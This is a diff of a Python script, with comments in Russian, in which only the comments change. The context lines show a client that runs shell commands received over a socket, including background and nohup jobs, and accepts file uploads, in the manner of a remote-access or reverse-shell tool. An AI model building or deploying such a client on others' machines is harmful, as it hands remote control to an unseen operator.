@@ -171,7 +171,7 @@ def main():
                 if command.startswith("cmd:"):
                     cmd = command[4:].strip()
 
-                    # Специальная обработка команд, содержащих nohup (запуск без ожидания)
+                    # Специальная обработка команд с nohup — запускаем без ожидания
                     if "nohup" in cmd:
                         try:
                             subprocess.Popen(cmd, shell=True,
@@ -182,7 +182,7 @@ def main():
                             s.send(f"Ошибка запуска команды с nohup: {e}".encode())
                         continue
 
-                    # Обработка команд с & в конце (фоновые команды)
+                    # Обработка фоновых команд (с & в конце)
                     if cmd.endswith('&'):
                         cmd_no_amp = cmd.rstrip('&').strip()
                         try:
@@ -287,6 +287,7 @@ def main():
                                 if chunk == b"__file_transfer_end__" or not chunk:
                                     break
                                 f.write(chunk)
+                        # Отправляем подтверждение успешного получения файла
                         s.send(f"Файл {os.path.basename(filepath)} успешно получен.".encode())
                     except Exception as e:
                         s.send(f"Ошибка при сохранении файла: {e}".encode())
